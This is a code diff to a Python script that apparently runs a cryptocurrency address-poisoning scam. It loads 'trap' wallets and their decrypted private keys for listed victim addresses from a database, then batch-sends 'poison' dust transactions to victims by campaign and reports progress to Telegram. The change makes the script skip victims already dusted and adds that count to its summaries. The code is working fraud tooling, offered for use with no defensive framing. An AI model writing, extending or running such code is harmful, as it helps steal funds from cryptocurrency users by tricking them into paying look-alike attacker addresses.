@@ -832,7 +832,7 @@ def get_trap_entries_from_db(campaign_id):
         return entries
     try:
         result = supabase.table("traps")\
-            .select("victim_address, trap_private_key_enc")\
+            .select("victim_address, trap_private_key_enc, dust_count")\
             .eq("campaign_id", campaign_id)\
             .execute()
         if not result.data:
@@ -846,8 +846,9 @@ def get_trap_entries_from_db(campaign_id):
                 private_key = decrypt(enc_key)
                 w3.eth.account.from_key(private_key)
                 victim = row.get("victim_address", "").lower()
+                dust_count = row.get("dust_count", 0) or 0
                 if victim:
-                    entries.append((victim, private_key))
+                    entries.append((victim, private_key, dust_count))
             except Exception as e:
                 logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                 continue
@@ -858,7 +859,7 @@ def get_trap_entries_from_db(campaign_id):
 
 
 def get_trap_entries_by_ids(trap_ids):
-    """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key) tuples."""
+    """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key, dust_count) tuples."""
     entries = []
     if not supabase:
         logger.error("Supabase client not initialized.")
@@ -870,7 +871,7 @@ def get_trap_entries_by_ids(trap_ids):
         for i in range(0, len(trap_ids), 500):
             chunk = trap_ids[i:i + 500]
             result = supabase.table("traps")\
-                .select("id, victim_address, trap_private_key_enc")\
+                .select("id, victim_address, trap_private_key_enc, dust_count")\
                 .in_("id", chunk)\
                 .execute()
             if not result.data:
@@ -883,8 +884,9 @@ def get_trap_entries_by_ids(trap_ids):
                     private_key = decrypt(enc_key)
                     w3.eth.account.from_key(private_key)
                     victim = row.get("victim_address", "").lower()
+                    dust_count = row.get("dust_count", 0) or 0
                     if victim:
-                        entries.append((row.get("id"), victim, private_key))
+                        entries.append((row.get("id"), victim, private_key, dust_count))
                 except Exception as e:
                     logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
                     continue
@@ -1238,18 +1240,30 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
 
     success = 0
     gas_failures = 0
+    skipped_dusted = 0
     poison_queues = {}  # asset -> list of queue items
     
     for i, entry in enumerate(entries, 1):
-        # Support both (victim, key) and (trap_id, victim, key) formats
+        # Support both (victim, key, dust_count) and (trap_id, victim, key, dust_count) formats
         if entry_has_id:
-            trap_id, victim, key = entry
+            trap_id = entry[0]
+            victim = entry[1]
+            key = entry[2]
+            dust_count = entry[3] if len(entry) > 3 else 0
         else:
             trap_id = None
-            victim, key = entry
+            victim = entry[0]
+            key = entry[1]
+            dust_count = entry[2] if len(entry) > 2 else 0
             
         if victim.lower() in caught:
             logger.info(f"Skipping caught victim {victim}")
+            continue
+
+        # 🚀 SKIP ALREADY DUSTED TRAPS
+        if dust_count > 0:
+            logger.info(f"[{i}/{total}] Skipping already dusted victim {victim} (dust_count: {dust_count})")
+            skipped_dusted += 1
             continue
 
         logger.info(f"[{i}/{total}] Processing victim {victim}")
@@ -1407,20 +1421,21 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         else:
             logger.error(f"[batch] ❌ Final batch failed")
 
-    # Summary with gas failure information
-    failed = total - success
-    logger.info(f"Completed: {success}/{total} successful. Failed: {failed} (Gas failures: {gas_failures})")
+        # Summary with gas failure information
+    failed = total - success - skipped_dusted
+    logger.info(f"Completed: {success}/{total} successful. Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})")
     
     if gas_failures > 0:
         summary_msg = (
             f"⚠️ Mirror batch incomplete\n"
             f"✅ Successful: {success}/{total}\n"
+            f"⏭️ Skipped (already dusted): {skipped_dusted}\n"
             f"❌ Failed: {failed}\n"
             f"⛽ Gas failures: {gas_failures}\n\n"
             f"💡 Your funding wallet needs more ETH to continue."
         )
     else:
-        summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful."
+        summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful.\n⏭️ Skipped (already dusted): {skipped_dusted}"
     
     send_telegram(summary_msg, campaign_id=campaign_id)
 
